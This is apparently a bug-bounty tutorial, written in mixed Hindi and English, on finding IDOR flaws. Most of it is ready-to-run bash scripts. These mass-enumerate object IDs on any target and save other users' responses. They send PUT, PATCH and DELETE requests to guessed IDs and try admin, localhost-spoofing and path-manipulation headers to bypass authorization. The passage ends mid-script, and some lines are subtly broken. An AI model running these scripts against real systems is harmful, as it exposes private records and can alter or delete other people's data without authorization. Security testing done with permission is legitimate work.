# 🔥 Elite Advanced IDOR (Insecure Direct Object Reference) Testing Methods

## 🎯 Overview
IDOR (Insecure Direct Object Reference) vulnerabilities occur jab application users ko direct access deta hai objects ko without proper authorization checks. Yeh technique $300-$1500+ tak ka bug dilwa sakti hai, especially jab sensitive data ya critical functions involved hote hain.

## 🛠️ Phase 1: IDOR Fundamentals & Types

### Understanding IDOR Vulnerability Types

#### 1. Numeric IDOR
```bash
# Sequential numeric IDs that can be enumerated
# Examples:
# /api/user/1234
# /api/document/5678
# /api/order/9012
```

#### 2. UUID/GUID IDOR
```bash
# UUIDs that might seem secure but can be predictable
# Examples:
# /api/user/550e8400-e29b-41d4-a716-446655440000
# /api/file/6ba7b810-9dad-11d1-80b4-00c04fd430c8
```

#### 3. Encoded IDOR
```bash
# Base64, URL encoded, or other encoded references
# Examples:
# /api/user/dXNlcjEyMzQ=  (base64 encoded "user1234")
# /api/file/dXNlci1kb2N1bWVudC0xMjM=
```

#### 4. Hashed IDOR
```bash
# MD5, SHA1, or other hashed references
# Examples:
# /api/user/5d41402abc4b2a76b9719d911017c592  (MD5 of "hello")
# /api/document/aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d  (SHA1)
```

## 🔍 Phase 2: Advanced IDOR Detection Framework

### Method 1: Intelligent IDOR Scanner
```bash
#!/bin/bash
# Advanced IDOR detection scanner
# Save as advanced_idor_scanner.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./advanced_idor_scanner.sh https://target.com"
    exit 1
fi

echo "🔍 Advanced IDOR Scanner - Starting comprehensive scan for $TARGET"
mkdir -p idor_results
cd idor_results

# Function to test numeric IDOR
test_numeric_idor() {
    local base_url=$1
    local endpoint=$2
    echo "🔢 Testing numeric IDOR on $base_url$endpoint"
    
    # Test range of numeric IDs
    for id in {1..100} {1000..1010} {9999..10001}; do
        echo "Testing ID: $id"
        
        response=$(curl -s -X GET \
            "$base_url$endpoint/$id" \
            -H "User-Agent: IDORTester" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}")
        
        # Parse response
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
        
        # Check for successful IDOR
        if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
            echo "✅ IDOR found: $base_url$endpoint/$id (Size: $size bytes)"
            echo "$base_url$endpoint/$id|$http_code|$size|$(date)" >> numeric_idor_found.txt
            
            # Save response for analysis
            curl -s "$base_url$endpoint/$id" > "response_${endpoint//\//_}_$id.txt"
        fi
        
        # Rate limiting
        sleep 0.1
    done
}

# Function to test UUID IDOR
test_uuid_idor() {
    local base_url=$1
    local endpoint=$2
    echo "🆔 Testing UUID IDOR on $base_url$endpoint"
    
    # Common UUID patterns and predictable UUIDs
    test_uuids=(
        "00000000-0000-0000-0000-000000000000"  # Null UUID
        "00000000-0000-0000-0000-000000000001"  # Sequential
        "11111111-1111-1111-1111-111111111111"  # Pattern
        "12345678-1234-1234-1234-123456789012"  # Predictable
        "550e8400-e29b-41d4-a716-446655440000"  # Common test UUID
        "6ba7b810-9dad-11d1-80b4-00c04fd430c8"  # Another common UUID
        "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"  # Pattern
        "ffffffff-ffff-ffff-ffff-ffffffffffff"  # Max values
    )
    
    for uuid in "${test_uuids[@]}"; do
        echo "Testing UUID: $uuid"
        
        response=$(curl -s -X GET \
            "$base_url$endpoint/$uuid" \
            -H "User-Agent: IDORTester" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
            echo "✅ UUID IDOR found: $base_url$endpoint/$uuid"
            echo "$base_url$endpoint/$uuid|$http_code|$size|$(date)" >> uuid_idor_found.txt
            
            # Save response
            curl -s "$base_url$endpoint/$uuid" > "response_uuid_${endpoint//\//_}_${uuid}.txt"
        fi
        
        sleep 0.1
    done
}

# Function to test encoded IDOR
test_encoded_idor() {
    local base_url=$1
    local endpoint=$2
    echo "🔐 Testing encoded IDOR on $base_url$endpoint"
    
    # Test common encoded values
    test_values=("admin" "user" "test" "guest" "root" "administrator" "1" "2" "100" "1000")
    
    for value in "${test_values[@]}"; do
        # Base64 encoding
        base64_encoded=$(echo -n "$value" | base64)
        echo "Testing Base64 encoded: $value -> $base64_encoded"
        
        response=$(curl -s -X GET \
            "$base_url$endpoint/$base64_encoded" \
            -H "User-Agent: IDORTester" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
            echo "✅ Encoded IDOR found: $base_url$endpoint/$base64_encoded (decoded: $value)"
            echo "$base_url$endpoint/$base64_encoded|$value|$http_code|$size|$(date)" >> encoded_idor_found.txt
        fi
        
        # URL encoding
        url_encoded=$(echo -n "$value" | xxd -plain | tr -d '
' | sed 's/\(..\)/%\1/g')
        echo "Testing URL encoded: $value -> $url_encoded"
        
        response=$(curl -s -X GET \
            "$base_url$endpoint/$url_encoded" \
            -H "User-Agent: IDORTester" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
            echo "✅ URL Encoded IDOR found: $base_url$endpoint/$url_encoded (decoded: $value)"
            echo "$base_url$endpoint/$url_encoded|$value|$http_code|$size|$(date)" >> encoded_idor_found.txt
        fi
        
        sleep 0.1
    done
}

# Function to test hashed IDOR
test_hashed_idor() {
    local base_url=$1
    local endpoint=$2
    echo "🔒 Testing hashed IDOR on $base_url$endpoint"
    
    # Test common values and their hashes
    test_values=("admin" "user" "test" "guest" "root" "1" "2" "100")
    
    for value in "${test_values[@]}"; do
        # MD5 hash
        if command -v md5sum >/dev/null 2>&1; then
            md5_hash=$(echo -n "$value" | md5sum | cut -d' ' -f1)
            echo "Testing MD5 hash: $value -> $md5_hash"
            
            response=$(curl -s -X GET \
                "$base_url$endpoint/$md5_hash" \
                -H "User-Agent: IDORTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ MD5 Hashed IDOR found: $base_url$endpoint/$md5_hash (original: $value)"
                echo "$base_url$endpoint/$md5_hash|$value|MD5|$http_code|$size|$(date)" >> hashed_idor_found.txt
            fi
        fi
        
        # SHA1 hash
        if command -v sha1sum >/dev/null 2>&1; then
            sha1_hash=$(echo -n "$value" | sha1sum | cut -d' ' -f1)
            echo "Testing SHA1 hash: $value -> $sha1_hash"
            
            response=$(curl -s -X GET \
                "$base_url$endpoint/$sha1_hash" \
                -H "User-Agent: IDORTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ SHA1 Hashed IDOR found: $base_url$endpoint/$sha1_hash (original: $value)"
                echo "$base_url$endpoint/$sha1_hash|$value|SHA1|$http_code|$size|$(date)" >> hashed_idor_found.txt
            fi
        fi
        
        sleep 0.1
    done
}

# Common IDOR-vulnerable endpoints
idor_endpoints=(
    "/api/user"
    "/api/users"
    "/api/profile"
    "/api/account"
    "/api/document"
    "/api/file"
    "/api/order"
    "/api/invoice"
    "/api/transaction"
    "/api/message"
    "/api/conversation"
    "/api/post"
    "/api/comment"
    "/api/admin/user"
    "/api/admin/users"
    "/user"
    "/users"
    "/profile"
    "/account"
    "/document"
    "/file"
    "/order"
    "/invoice"
)

# Test each endpoint with different IDOR techniques
for endpoint in "${idor_endpoints[@]}"; do
    echo "🎯 Testing endpoint: $endpoint"
    
    # Check if endpoint exists
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint/1")
    if [[ "$response" != "404" ]]; then
        echo "✅ Endpoint exists: $endpoint"
        
        # Test different IDOR types
        test_numeric_idor "$TARGET" "$endpoint"
        test_uuid_idor "$TARGET" "$endpoint"
        test_encoded_idor "$TARGET" "$endpoint"
        test_hashed_idor "$TARGET" "$endpoint"
    else
        echo "❌ Endpoint not found: $endpoint"
    fi
    
    sleep 1
done

echo "✅ Advanced IDOR scanning completed!"
cd ..
```

### Method 2: Parameter-Based IDOR Testing
```bash
# Parameter-based IDOR testing
parameter_idor_tester() {
    local target=$1
    echo "📋 Testing parameter-based IDOR for $target"
    
    mkdir -p parameter_idor_tests
    cd parameter_idor_tests
    
    # Test GET parameter IDOR
    test_get_parameter_idor() {
        echo "🔍 Testing GET parameter IDOR..."
        
        # Common parameter names that might be vulnerable
        parameter_names=("id" "user_id" "userId" "uid" "account_id" "accountId" "doc_id" "docId" "file_id" "fileId" "order_id" "orderId")
        
        # Common endpoints that might use parameters
        test_endpoints=("/api/profile" "/api/document" "/api/file" "/api/order" "/profile" "/document")
        
        for endpoint in "${test_endpoints[@]}"; do
            for param in "${parameter_names[@]}"; do
                echo "Testing: $target$endpoint?$param=VALUE"
                
                # Test numeric values
                for id in {1..20} {100..105} {1000..1002}; do
                    response=$(curl -s -X GET \
                        "$target$endpoint?$param=$id" \
                        -H "User-Agent: IDORTester" \
                        -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                    
                    http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                    size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                    
                    if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                        echo "✅ GET Parameter IDOR: $target$endpoint?$param=$id"
                        echo "$target$endpoint?$param=$id|$http_code|$size|$(date)" >> get_parameter_idor.txt
                        
                        # Save response for analysis
                        curl -s "$target$endpoint?$param=$id" > "get_response_${endpoint//\//_}_${param}_$id.txt"
                    fi
                done
                
                sleep 0.5
            done
        done
    }
    
    # Test POST parameter IDOR
    test_post_parameter_idor() {
        echo "📤 Testing POST parameter IDOR..."
        
        # Test POST requests with IDOR parameters
        post_endpoints=("/api/user/update" "/api/profile/update" "/api/account/update" "/api/document/view")
        
        for endpoint in "${post_endpoints[@]}"; do
            echo "Testing POST endpoint: $endpoint"
            
            # Test different parameter combinations
            post_payloads=(
                '{"id": 1, "action": "view"}'
                '{"user_id": 2, "data": "test"}'
                '{"userId": 3, "update": true}'
                '{"account_id": 4, "operation": "read"}'
                '{"doc_id": 5, "access": "full"}'
                '{"file_id": 6, "download": true}'
            )
            
            for payload in "${post_payloads[@]}"; do
                echo "Testing payload: $payload"
                
                response=$(curl -s -X POST \
                    -H "Content-Type: application/json" \
                    -d "$payload" \
                    "$target$endpoint" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                if [[ "$http_code" == "200" && "$size" -gt 50 ]]; then
                    echo "✅ POST Parameter IDOR: $target$endpoint with $payload"
                    echo "$target$endpoint|$payload|$http_code|$size|$(date)" >> post_parameter_idor.txt
                fi
                
                sleep 0.5
            done
        done
    }
    
    # Test JSON body IDOR
    test_json_body_idor() {
        echo "📋 Testing JSON body IDOR..."
        
        # Test nested JSON IDOR
        json_endpoints=("/api/data" "/api/fetch" "/api/get" "/api/retrieve")
        
        for endpoint in "${json_endpoints[@]}"; do
            echo "Testing JSON endpoint: $endpoint"
            
            # Test nested object references
            json_payloads=(
                '{"user": {"id": 1}, "action": "get_profile"}'
                '{"target": {"user_id": 2}, "operation": "view"}'
                '{"reference": {"account_id": 3, "type": "admin"}}'
                '{"object": {"doc_id": 4}, "permission": "read"}'
                '{"entity": {"file_id": 5}, "access_level": "full"}'
            )
            
            for payload in "${json_payloads[@]}"; do
                echo "Testing JSON payload: $payload"
                
                response=$(curl -s -X POST \
                    -H "Content-Type: application/json" \
                    -d "$payload" \
                    "$target$endpoint" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                if [[ "$http_code" == "200" && "$size" -gt 50 ]]; then
                    echo "✅ JSON Body IDOR: $target$endpoint with $payload"
                    echo "$target$endpoint|$payload|$http_code|$size|$(date)" >> json_body_idor.txt
                fi
                
                sleep 0.5
            done
        done
    }
    
    # Run all parameter tests
    test_get_parameter_idor
    test_post_parameter_idor
    test_json_body_idor
    
    cd ..
}
```

### Method 3: Advanced IDOR Enumeration
```bash
# Advanced IDOR enumeration techniques
advanced_idor_enumeration() {
    local target=$1
    echo "🔢 Advanced IDOR enumeration for $target"
    
    mkdir -p advanced_idor_enum
    cd advanced_idor_enum
    
    # Test predictable ID patterns
    test_predictable_patterns() {
        echo "🎯 Testing predictable ID patterns..."
        
        local endpoint=$1
        
        # Test different ID patterns
        patterns=(
            # Sequential patterns
            "1 2 3 4 5"
            "10 20 30 40 50"
            "100 200 300 400 500"
            
            # Date-based patterns (YYYYMMDD format)
            "20240101 20240102 20240103"
            "20231201 20231202 20231203"
            
            # Timestamp-based patterns
            "1640995200 1640995260 1640995320"  # Unix timestamps
            
            # Hex patterns
            "a b c d e f"
            "1a 2b 3c 4d 5e"
            
            # Common system IDs
            "admin root guest test demo"
        )
        
        for pattern in "${patterns[@]}"; do
            echo "Testing pattern: $pattern"
            
            for id in $pattern; do
                response=$(curl -s -X GET \
                    "$target$endpoint/$id" \
                    -H "User-Agent: IDOREnumerator" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                    echo "✅ Pattern IDOR found: $target$endpoint/$id"
                    echo "$target$endpoint/$id|$pattern|$http_code|$size|$(date)" >> pattern_idor_found.txt
                fi
                
                sleep 0.1
            done
        done
    }
    
    # Test ID manipulation techniques
    test_id_manipulation() {
        echo "🔧 Testing ID manipulation techniques..."
        
        local endpoint=$1
        local base_id=${2:-"123"}
        
        # Different manipulation techniques
        manipulations=(
            "$base_id"                    # Original
            "0$base_id"                   # Leading zero
            "$base_id.0"                  # Decimal
            "$base_id.1"                  # Decimal variant
            "${base_id}0"                 # Trailing zero
            "$((base_id + 1))"           # Increment
            "$((base_id - 1))"           # Decrement
            "$((base_id * 10))"          # Multiply
            "$((base_id / 10))"          # Divide (if > 10)
            "-$base_id"                   # Negative
            "$(printf '%x' $base_id)"     # Hexadecimal
            "$(printf '%o' $base_id)"     # Octal
        )
        
        for manip_id in "${manipulations[@]}"; do
            if [[ ! -z "$manip_id" ]]; then
                echo "Testing manipulated ID: $manip_id"
                
                response=$(curl -s -X GET \
                    "$target$endpoint/$manip_id" \
                    -H "User-Agent: IDORManipulator" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                    echo "✅ ID Manipulation IDOR: $target$endpoint/$manip_id"
                    echo "$target$endpoint/$manip_id|$base_id|$http_code|$size|$(date)" >> manipulation_idor_found.txt
                fi
                
                sleep 0.1
            fi
        done
    }
    
    # Test mass enumeration with threading
    test_mass_enumeration() {
        echo "🚀 Testing mass enumeration..."
        
        local endpoint=$1
        local start_id=${2:-1}
        local end_id=${3:-1000}
        
        echo "Mass enumerating IDs from $start_id to $end_id on $endpoint"
        
        # Function for single ID test
        test_single_id() {
            local id=$1
            local endpoint=$2
            local target=$3
            
            response=$(curl -s -X GET \
                "$target$endpoint/$id" \
                -H "User-Agent: IDORMassEnum" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}" \
                --max-time 5)
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ Mass Enum IDOR: $target$endpoint/$id (Size: $size)"
                echo "$target$endpoint/$id|$http_code|$size|$(date)" >> mass_enum_idor_found.txt
            fi
        }
        
        export -f test_single_id
        
        # Use parallel processing if available
        if command -v parallel >/dev/null 2>&1; then
            seq $start_id $end_id | parallel -j 10 test_single_id {} "$endpoint" "$target"
        else
            # Sequential processing
            for id in $(seq $start_id $end_id); do
                test_single_id "$id" "$endpoint" "$target"
                
                # Rate limiting
                if (( id % 50 == 0 )); then
                    sleep 1
                fi
            done
        fi
    }
    
    # Test common endpoints
    common_endpoints=("/api/user" "/api/document" "/api/file" "/api/order")
    
    for endpoint in "${common_endpoints[@]}"; do
        echo "🎯 Testing endpoint: $endpoint"
        
        # Check if endpoint exists
        response=$(curl -s -o /dev/null -w "%{http_code}" "$target$endpoint/1")
        if [[ "$response" != "404" ]]; then
            test_predictable_patterns "$endpoint"
            test_id_manipulation "$endpoint" "123"
            test_mass_enumeration "$endpoint" "1" "100"  # Limited range for testing
        fi
        
        sleep 2
    done
    
    cd ..
}
```

## 🎯 Phase 3: Specialized IDOR Techniques

### Method 1: Blind IDOR Detection
```bash
# Blind IDOR detection techniques
blind_idor_detection() {
    local target=$1
    echo "👁️ Blind IDOR detection for $target"
    
    mkdir -p blind_idor_tests
    cd blind_idor_tests
    
    # Test timing-based blind IDOR
    test_timing_based_idor() {
        echo "⏱️ Testing timing-based blind IDOR..."
        
        local endpoint=$1
        
        # Measure baseline timing
        echo "📊 Measuring baseline timing..."
        baseline_times=()
        
        for i in {1..5}; do
            start_time=$(date +%s%N)
            curl -s "$target$endpoint/99999999" > /dev/null  # Non-existent ID
            end_time=$(date +%s%N)
            duration=$(((end_time - start_time) / 1000000))  # Convert to milliseconds
            baseline_times+=($duration)
        done
        
        # Calculate average baseline
        total=0
        for time in "${baseline_times[@]}"; do
            total=$((total + time))
        done
        avg_baseline=$((total / ${#baseline_times[@]}))
        echo "Average baseline time: ${avg_baseline}ms"
        
        # Test potential IDOR IDs
        echo "🧪 Testing potential IDOR IDs..."
        
        for id in {1..50}; do
            start_time=$(date +%s%N)
            response=$(curl -s "$target$endpoint/$id" -w "%{http_code}")
            end_time=$(date +%s%N)
            duration=$(((end_time - start_time) / 1000000))
            
            http_code=$(echo "$response" | tail -1)
            
            # Check for timing differences
            time_diff=$((duration - avg_baseline))
            
            if [[ $time_diff -gt 500 ]] || [[ $time_diff -lt -500 ]]; then  # More than 500ms difference
                echo "⚠️ Timing anomaly detected for ID $id: ${duration}ms (diff: ${time_diff}ms)"
                echo "$target$endpoint/$id|TIMING|$duration|$time_diff|$(date)" >> timing_based_idor.txt
            fi
            
            # Also check for different HTTP codes
            if [[ "$http_code" != "404" && "$http_code" != "403" ]]; then
                echo "✅ Potential blind IDOR: $target$endpoint/$id (HTTP: $http_code, Time: ${duration}ms)"
                echo "$target$endpoint/$id|$http_code|$duration|$(date)" >> blind_idor_found.txt
            fi
            
            sleep 0.2
        done
    }
    
    # Test error-based blind IDOR
    test_error_based_idor() {
        echo "❌ Testing error-based blind IDOR..."
        
        local endpoint=$1
        
        # Test different IDs and analyze error messages
        for id in {1..30}; do
            echo "Testing ID: $id"
            
            response=$(curl -s "$target$endpoint/$id" 2>&1)
            
            # Look for different error patterns
            if echo "$response" | grep -qi "unauthorized\|forbidden\|access denied"; then
                echo "🔒 Authorization error for ID $id - potential valid object"
                echo "$target$endpoint/$id|AUTH_ERROR|$(date)" >> error_based_idor.txt
            elif echo "$response" | grep -qi "not found\|does not exist\|invalid"; then
                echo "❌ Not found error for ID $id"
            elif echo "$response" | grep -qi "internal server error\|database error\|sql"; then
                echo "💥 Server error for ID $id - potential valid object"
                echo "$target$endpoint/$id|SERVER_ERROR|$(date)" >> error_based_idor.txt
            elif [[ ! -z "$response" ]] && ! echo "$response" | grep -qi "error\|not found"; then
                echo "✅ Potential valid response for ID $id"
                echo "$target$endpoint/$id|VALID_RESPONSE|$(date)" >> error_based_idor.txt
                
                # Save response for analysis
                echo "$response" > "error_response_$id.txt"
            fi
            
            sleep 0.3
        done
    }
    
    # Test content-length based blind IDOR
    test_content_length_idor() {
        echo "📏 Testing content-length based blind IDOR..."
        
        local endpoint=$1
        
        # Collect content lengths for analysis
        echo "📊 Collecting content length data..."
        
        for id in {1..50}; do
            response=$(curl -s -I "$target$endpoint/$id" -w "SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep "HTTP" | awk '{print $2}')
            content_length=$(echo "$response" | grep -i "content-length" | awk '{print $2}' | tr -d '')
            size_download=$(echo "$response" | grep "SIZE:" | cut -d: -f2)
            
            echo "$id|$http_code|$content_length|$size_download" >> content_length_data.txt
            
            sleep 0.1
        done
        
        # Analyze content length patterns
        echo "🔍 Analyzing content length patterns..."
        
        # Find IDs with unusual content lengths
        if [[ -f content_length_data.txt ]]; then
            # Get most common content length (likely error page)
            common_length=$(cut -d'|' -f3 content_length_data.txt | sort | uniq -c | sort -nr | head -1 | awk '{print $2}')
            echo "Most common content length: $common_length"
            
            # Find outliers
            while IFS='|' read -r id http_code content_length size_download; do
                if [[ "$content_length" != "$common_length" && ! -z "$content_length" ]]; then
                    echo "📏 Content length anomaly for ID $id: $content_length bytes"
                    echo "$target$endpoint/$id|CONTENT_LENGTH|$content_length|$(date)" >> content_length_idor.txt
                fi
            done < content_length_data.txt
        fi
    }
    
    # Test common endpoints for blind IDOR
    blind_test_endpoints=("/api/user" "/api/document" "/api/file" "/api/message")
    
    for endpoint in "${blind_test_endpoints[@]}"; do
        echo "🎯 Testing blind IDOR on endpoint: $endpoint"
        
        test_timing_based_idor "$endpoint"
        test_error_based_idor "$endpoint"
        test_content_length_idor "$endpoint"
        
        sleep 2
    done
    
    cd ..
}
```

### Method 2: IDOR in Different HTTP Methods
```bash
# Test IDOR across different HTTP methods
http_method_idor_testing() {
    local target=$1
    echo "🔄 Testing IDOR across different HTTP methods for $target"
    
    mkdir -p http_method_idor_tests
    cd http_method_idor_tests
    
    # Test IDOR with different HTTP methods
    test_method_based_idor() {
        local endpoint=$1
        local id=$2
        
        echo "🧪 Testing HTTP methods for $endpoint/$id"
        
        # HTTP methods to test
        methods=("GET" "POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")
        
        for method in "${methods[@]}"; do
            echo "Testing method: $method"
            
            case "$method" in
                "GET"|"HEAD"|"OPTIONS")
                    response=$(curl -s -X "$method" \
                        "$target$endpoint/$id" \
                        -H "User-Agent: IDORMethodTester" \
                        -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                    ;;
                "POST"|"PUT"|"PATCH")
                    response=$(curl -s -X "$method" \
                        -H "Content-Type: application/json" \
                        -d '{"test": "idor_method_test"}' \
                        "$target$endpoint/$id" \
                        -H "User-Agent: IDORMethodTester" \
                        -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                    ;;
                "DELETE")
                    response=$(curl -s -X "$method" \
                        "$target$endpoint/$id" \
                        -H "User-Agent: IDORMethodTester" \
                        -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                    ;;
            esac
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            # Check for successful IDOR
            if [[ "$http_code" == "200" || "$http_code" == "201" || "$http_code" == "204" ]]; then
                if [[ "$size" -gt 50 ]] || [[ "$method" == "DELETE" ]]; then
                    echo "✅ Method-based IDOR: $method $target$endpoint/$id (HTTP: $http_code)"
                    echo "$method|$target$endpoint/$id|$http_code|$size|$(date)" >> method_based_idor.txt
                    
                    # Save response for analysis (except for DELETE)
                    if [[ "$method" != "DELETE" ]]; then
                        curl -s -X "$method" "$target$endpoint/$id" > "method_response_${method}_${endpoint//\//_}_$id.txt"
                    fi
                fi
            fi
            
            sleep 0.5
        done
    }
    
    # Test HTTP method override
    test_method_override_idor() {
        local endpoint=$1
        local id=$2
        
        echo "🔄 Testing HTTP method override for $endpoint/$id"
        
        # Method override headers
        override_headers=(
            "X-HTTP-Method-Override"
            "X-HTTP-Method"
            "X-Method-Override"
            "_method"
        )
        
        override_methods=("PUT" "DELETE" "PATCH")
        
        for header in "${override_headers[@]}"; do
            for method in "${override_methods[@]}"; do
                echo "Testing override: $header: $method"
                
                response=$(curl -s -X POST \
                    -H "$header: $method" \
                    -H "Content-Type: application/json" \
                    -d '{"test": "method_override"}' \
                    "$target$endpoint/$id" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                if [[ "$http_code" == "200" || "$http_code" == "201" || "$http_code" == "204" ]]; then
                    echo "✅ Method Override IDOR: $header: $method on $target$endpoint/$id"
                    echo "$header|$method|$target$endpoint/$id|$http_code|$size|$(date)" >> method_override_idor.txt
                fi
                
                sleep 0.5
            done
        done
    }
    
    # Test endpoints with different methods
    method_test_endpoints=("/api/user" "/api/document" "/api/file" "/api/message")
    test_ids=(1 2 5 10 100)
    
    for endpoint in "${method_test_endpoints[@]}"; do
        for id in "${test_ids[@]}"; do
            echo "🎯 Testing $endpoint with ID $id"
            
            test_method_based_idor "$endpoint" "$id"
            test_method_override_idor "$endpoint" "$id"
            
            sleep 1
        done
    done
    
    cd ..
}
```

### Method 3: Advanced IDOR Bypass Techniques
```bash
# Advanced IDOR bypass techniques
advanced_idor_bypass() {
    local target=$1
    echo "🚀 Advanced IDOR bypass techniques for $target"
    
    mkdir -p advanced_idor_bypass
    cd advanced_idor_bypass
    
    # Test header-based IDOR bypass
    test_header_bypass() {
        local endpoint=$1
        local id=$2
        
        echo "📋 Testing header-based IDOR bypass for $endpoint/$id"
        
        # Headers that might bypass authorization
        bypass_headers=(
            "X-Original-URL: $endpoint/$id"
            "X-Rewrite-URL: $endpoint/$id"
            "X-Forwarded-For: 127.0.0.1"
            "X-Real-IP: 127.0.0.1"
            "X-Originating-IP: 127.0.0.1"
            "X-Remote-IP: 127.0.0.1"
            "X-Client-IP: 127.0.0.1"
            "X-Forwarded-Host: localhost"
            "X-Host: localhost"
            "Referer: $target$endpoint/$id"
            "Origin: $target"
            "X-Requested-With: XMLHttpRequest"
            "X-Admin: true"
            "X-User-Role: admin"
            "X-Is-Admin: 1"
            "X-Bypass: true"
            "X-Debug: true"
        )
        
        for header in "${bypass_headers[@]}"; do
            echo "Testing header: $header"
            
            response=$(curl -s -X GET \
                -H "$header" \
                "$target$endpoint/$id" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ Header bypass IDOR: $header"
                echo "$target$endpoint/$id|$header|$http_code|$size|$(date)" >> header_bypass_idor.txt
            fi
            
            sleep 0.3
        done
    }
    
    # Test path manipulation bypass
    test_path_manipulation() {
        local endpoint=$1
        local id=$2
        
        echo "📂 Testing path manipulation bypass for $endpoint/$id"
        
        # Path manipulation techniques
        path_manipulations=(
            "$endpoint/$id"
            "$endpoint/../$endpoint/$id"
            "$endpoint/.$id"
            "$endpoint/./$id"
            "$endpoint//$id"
            "$endpoint\$id"
            "$endpoint%2f$id"
            "$endpoint%2F$id"
            "$endpoint%5c$id"
            "$endpoint;$id"
            "$endpoint?id=$id"
            "$endpoint#$id"
        )
        
        for path in "${path_manipulations[@]}"; do
            echo "Testing path: $path"
            
            response=$(curl -s -X GET \
                "$target$path" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ Path manipulation IDOR: $path"
                echo "$target$path|PATH_MANIPULATION|$http_code|$size|$(date)" >> path_manipulation_idor.txt
            fi
            
            sleep 0.3
        done
    }
    
    # Test content-type bypass
    test_content_type_bypass() {
        local endpoint=$1
        local id=$2
        
        echo "📄 Testing content-type bypass for $endpoint/$id"
        
        # Different content types that might bypass restrictions
        content_types=(
            "application/json"
            "application/xml"
            "text/xml"
            "application/x-www-form-urlencoded"
            "multipart/form-data"
            "text/plain"
            "application/javascript"
            "text/html"
            "application/octet-stream"
        )
